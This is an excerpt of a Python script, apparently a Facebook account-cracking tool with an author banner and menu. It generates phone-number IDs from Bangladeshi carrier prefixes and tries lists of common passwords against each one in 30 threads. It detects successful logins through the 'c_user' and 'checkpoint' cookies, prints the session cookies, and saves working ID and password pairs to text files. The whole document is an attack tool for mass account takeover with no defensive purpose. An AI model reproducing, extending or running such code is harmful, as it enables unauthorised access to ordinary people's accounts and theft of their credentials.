...
\033[1;37m..:::::..::..:::::..:::.......:::..::::..::
\033[1;33m --------------------------------------------------
\033[1;37m [•] AUTHOR     : \033[1;32mARUN SHAKYA\033[1;37m
\033[1;37m [•] GITHUB     : \033[1;32mPRIVATE \033[1;37m
...
def menu():
	...
	opt = input('[?] Choose : ')
	if opt =='1':
		os.system("xdg-open https://www.facebook.com/profile.php?id=100015018970813")
		random_crack()
	if opt =='2':
		os.system("xdg-open https://www.facebook.com/profile.php?id=100015018970813")
		menu()
...
def random_bd_number():
	user=[]
	os.system('clear')
	print(logo)
	print('[+] bd code  : 017,019,018,015,016')
	print(47*'-')
	kode = input('[?] Choice Code : ')
	os.system('clear')
	print(logo)
	print(' EXAMPLE CLONE : 3000  4000 5000 50000')
	print('------------------------------------')
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'bangladesh','sadiya','taniya','jannatul','tamanna','freefire','Mehedi123','prema123']
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in Arunok.txt,Aruncp.txt')
	print(47*"-")
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[ARUN-XD-OK] '+uid+' | '+ps+'\033[0;97m')
				print(f"\033[1;33mCOOKIE : \033[1;97m{coki}")
				open('Arunok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[ARUN-XD-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('Aruncp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r[\033[1;92mARUN-XD\033[1;97m] [%s/%s]>[\033[1;32mOK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
menu() 
